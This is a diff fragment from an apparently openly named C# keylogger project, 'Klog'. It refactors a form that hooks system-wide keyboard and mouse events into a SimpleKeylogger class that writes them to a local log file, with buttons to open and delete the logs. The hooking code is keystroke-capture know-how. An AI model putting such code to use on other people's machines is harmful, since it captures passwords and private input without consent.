@@ -18,31 +18,27 @@ namespace Klog
     public partial class OptionsForm : Form
     {
         UserActivityHook _hook;
-        IKeylogger _logger;
-
-        const String LogFileName = @"Logs\Klog.txt";
 
         public OptionsForm()
         {
             InitializeComponent();
 
-            Directory.CreateDirectory(Path.GetDirectoryName(LogFileName));
+            Directory.CreateDirectory(Path.GetDirectoryName(SimpleKeylogger.LogFileName));
 
-            //_logger = new SimpleKeylogger(new LogEventDelegate(LogToTextbox));
-            _logger = new SimpleKeylogger(new LogEventDelegate(LogToFile));
-
-            InitHooks();
+            InitializeKeylogger();
             StartHooks();
         }
 
         #region Hooks
-        void InitHooks()
+        void InitializeKeylogger()
         {
+            SimpleKeylogger logger = new SimpleKeylogger();
+
             _hook = new UserActivityHook(false, false);
-            _hook.KeyPress += _logger.OnKeyPress;
-            _hook.KeyUp += _logger.OnKeyUp;
-            _hook.KeyDown += _logger.OnKeyDown;
-            _hook.OnMouseActivity += _logger.OnMouseActivity;
+            _hook.KeyPress += logger.OnKeyPress;
+            _hook.KeyUp += logger.OnKeyUp;
+            _hook.KeyDown += logger.OnKeyDown;
+            _hook.OnMouseActivity += logger.OnMouseActivity;
         }
 
         void StartHooks()
@@ -68,11 +64,6 @@ namespace Klog
         }
         #endregion
 
-        void LogToFile(String s)
-        {
-            //tbLog.AppendText(s);
-            File.AppendAllText(LogFileName, s);
-        }
 
         private void OptionsForm_Activated(object sender, EventArgs e)
         {
@@ -103,12 +94,12 @@ namespace Klog
 
         private void bOpenLog_Click(object sender, EventArgs e)
         {
-            Process.Start(LogFileName);
+            Process.Start(SimpleKeylogger.LogFileName);
         }
 
         private void bDeleteLogs_Click(object sender, EventArgs e)
         {
-            DirectoryInfo dir = new DirectoryInfo(Path.GetDirectoryName(LogFileName));
+            DirectoryInfo dir = new DirectoryInfo(Path.GetDirectoryName(SimpleKeylogger.LogFileName));
             dir.Delete(true);
             dir.Create();
         }
